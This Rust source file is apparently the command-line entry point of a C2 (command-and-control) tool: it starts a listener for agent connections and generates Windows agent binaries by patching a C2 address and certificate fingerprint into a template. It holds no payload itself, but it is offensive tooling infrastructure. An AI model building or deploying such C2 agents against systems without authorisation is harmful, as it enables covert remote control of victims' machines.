use anyhow::Result;
use c2_core::C2Core;
use c2_generator::AgentGenerator;
use clap::{Args, Parser, Subcommand};
use std::path::PathBuf;

#[derive(Parser)]
#[command(name = "rust-remote-admin-c2")]
#[command(about = "C2 control server + agent generator")]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Start the C2 server to listen for agent connections.
    Server {
        /// Listen address, e.g. 0.0.0.0:9000
        #[arg(default_value = "0.0.0.0:9000")]
        addr: String,
    },
    /// Generate a configured agent binary.
    ///
    /// Takes a pre-compiled agent template and patches in C2 connection config.
    /// Use --hash-template to verify the template's integrity without patching.
    #[command(args_conflicts_with_subcommands = false)]
    GenerateAgent(GenerateArgs),
}

#[derive(Args, Clone)]
struct GenerateArgs {
    /// Path to the pre-compiled agent template binary
    #[arg(long, short, default_value = "rust-remote-admin-agent.exe")]
    template: PathBuf,

    /// Output path for the generated agent
    #[arg(long, short, default_value = "agent.exe", required = false)]
    output: PathBuf,

    /// C2 server address in host:port format
    #[arg(long, required_unless_present = "hash_template")]
    c2_address: Option<String>,

    /// TLS certificate fingerprint (hex SHA256)
    #[arg(long, required_unless_present = "hash_template")]
    cert_fingerprint: Option<String>,

    /// Unique agent identifier
    #[arg(long, default_value_t = 1)]
    agent_id: u32,

    /// Hash the template and exit (no patch)
    #[arg(long)]
    hash_template: bool,
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info"))
        .format_timestamp_secs()
        .init();

    let cli = Cli::parse();

    match cli.command.unwrap_or(Commands::Server {
        addr: "0.0.0.0:9000".to_string(),
    }) {
        Commands::Server { addr } => {
            let core = C2Core::new();
            log::info!("Starting C2 server on {}", addr);
            if let Err(e) = core.run_listener(&addr).await {
                log::error!("C2 server error: {e}");
                std::process::exit(1);
            }
        }
        Commands::GenerateAgent(args) => {
            let generator = AgentGenerator::from_file(&args.template)?;

            if args.hash_template {
                println!("Template hash: {}", generator.hash_template());
                println!("Template size: {}", args.template.metadata()?.len());
                return Ok(());
            }

            let c2 = args
                .c2_address
                .ok_or_else(|| anyhow::anyhow!("--c2-address is required"))?;
            let fp = args
                .cert_fingerprint
                .ok_or_else(|| anyhow::anyhow!("--cert-fingerprint is required"))?;

            generator.generate(&c2, &fp, args.agent_id, &args.output)?;
            println!(
                "Generated agent {} -> {} ({})",
                args.agent_id,
                args.output.display(),
                std::fs::metadata(&args.output)?.len()
            );
        }
    }

    Ok(())
}
